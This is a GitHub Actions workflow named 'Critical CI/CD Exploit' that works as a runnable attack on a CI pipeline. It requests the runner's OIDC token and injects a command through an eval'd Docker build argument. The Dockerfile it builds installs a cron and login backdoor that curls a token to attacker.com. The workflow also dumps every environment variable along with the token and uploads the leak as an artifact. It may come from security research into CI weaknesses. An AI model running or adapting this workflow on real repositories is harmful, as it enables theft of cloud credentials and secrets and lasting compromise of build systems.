name: Critical CI/CD Exploit
on:
  push:
    branches: [ main ]

jobs:
  attack:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Get OIDC Token and Prepare Payload
        id: get_token
        run: |
          echo "--- Debugging OIDC Token Request Environment Variables ---"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN directly from shell env: '$ACTIONS_ID_TOKEN_REQUEST_TOKEN'"
          echo "ACTIONS_ID_TOKEN_REQUEST_URL directly from shell env: '$ACTIONS_ID_TOKEN_REQUEST_URL'"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN from env context: '${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}'"
          echo "ACTIONS_ID_TOKEN_REQUEST_URL from env context: '${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}'"
          echo "--------------------------------------------------------"

          # Verify if the URL is populated before attempting curl
          # Now using direct shell variable access, as shown to be populated by debug output
          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "Error: ACTIONS_ID_TOKEN_REQUEST_URL is empty. Cannot fetch OIDC token. Exiting."
            exit 1
          fi

          # Fetch the actual OIDC token using the request token and URL
          # Using direct shell variable access
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
          
          echo "Fetched OIDC Token (may be empty if request failed): '$OIDC_TOKEN'"
          echo "OIDC_TOKEN_VALUE=$OIDC_TOKEN" >> "$GITHUB_OUTPUT"

          mkdir -p ./taskcluster/docker/python
          cat <<'EOF_DOCKERFILE' > ./taskcluster/docker/python/Dockerfile
          FROM python:3.11-alpine
          ARG PYTHON_VERSION
          ARG EXFIL_OIDC_TOKEN

          RUN apk add --no-cache curl && \
              echo "[+] Installing backdoor..." && \
              echo '#!/bin/sh' > /usr/local/bin/init.sh && \
              echo 'curl -s http://attacker.com/exfil?token=$(cat /token)' >> /usr/local/bin/init.sh && \
              chmod +x /usr/local/bin/init.sh && \
              echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \
              echo "/usr/local/bin/init.sh" >> /etc/profile && \
              echo "[+] Dumping secrets..." && \
              { echo "===== ENV ====="; printenv; echo "===== OIDC TOKEN ====="; echo "$EXFIL_OIDC_TOKEN"; } > /leaks.txt && \
              eval "$PYTHON_VERSION"
          EOF_DOCKERFILE

          MALICIOUS_PAYLOAD="whoami && pwd && ls -la /"
          echo "MALICIOUS_PAYLOAD_VALUE=$MALICIOUS_PAYLOAD" >> "$GITHUB_OUTPUT"

      - name: Build and Run Malicious Docker Image
        run: |
          docker build \
            --build-arg PYTHON_VERSION="${{ steps.get_token.outputs.MALICIOUS_PAYLOAD_VALUE }}" \
            --build-arg EXFIL_OIDC_TOKEN="${{ steps.get_token.outputs.OIDC_TOKEN_VALUE }}" \
            -t malicious \
            ./taskcluster/docker/python

          docker run --rm malicious cat /leaks.txt > leaks.txt

      - name: Upload Exfiltrated Data
        uses: actions/upload-artifact@v4
        with:
          name: ci-leaks
          path: leaks.txt
